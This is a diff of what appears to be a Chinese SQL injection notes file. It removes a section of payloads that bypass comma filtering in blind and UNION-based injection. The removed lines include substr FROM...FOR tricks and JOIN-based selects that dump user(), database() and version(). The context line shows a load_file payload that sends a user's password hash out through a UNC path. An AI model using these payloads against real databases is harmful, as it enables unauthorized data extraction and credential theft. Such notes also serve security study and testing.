@@ -300,27 +300,6 @@ union select 1,2,load_file(CONCAT('\\',(SELECT hex(pass) FROM user WHERE name='a
  - 使用mysqli_set_charset(GBK)指定字符集
  - 使用mysqli_real_escape_string进行转义
 
-### 过滤了逗号怎么办
-
-**盲注的时候**
-```sql
-LIMIT M OFFSET N    
---这里的 M 是最大回显限度，N是偏移量
---与limit N,M 有相同效果
-
-' and ascii(substr((select database()),1,1))=xxx#
---可变为
-' and ascii(substr((select database())from 1 for 1))=xxx#
-```
-
-**union联合查询注入时**
-```sql
-union select 1,2,3
-union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)%23
-
-union select * from ((select 1)a JOIN (select 2)b JOIN (select CONCAT_WS(CHAR(32,58,32),user(),database(),version()))c)%23
-```
-
 ### 二阶注入
 
 > 当数据首次插入到数据库中时，许多应用程序能够安全处理这些数据；addslashes() 等字符转义函数。
